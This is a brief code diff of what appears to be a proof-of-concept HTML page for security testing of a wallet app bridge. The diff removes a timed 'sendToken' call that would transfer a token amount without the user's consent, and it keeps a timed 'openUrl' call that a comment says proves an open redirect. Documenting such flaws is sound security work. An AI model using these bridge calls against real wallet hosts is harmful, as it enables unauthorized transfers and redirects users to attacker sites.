@@ -82,19 +82,8 @@
 			// 4. Redirect user to attacker site (10s) — proves open redirect
 
 			setTimeout(function () {
-				call(
-					"sendToken",
-					wireRaw({
-						token: "eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-						amount: "0.0001",
-						recipientAddress: "0x0000000000000000000000000000000000000001",
-					}),
-				);
-			}, 7000);
-
-			setTimeout(function () {
 				call("openUrl", wireRaw("https://example.com"));
-			}, 10000);
+			}, 8000);
 		</script>
 	</body>
 </html>
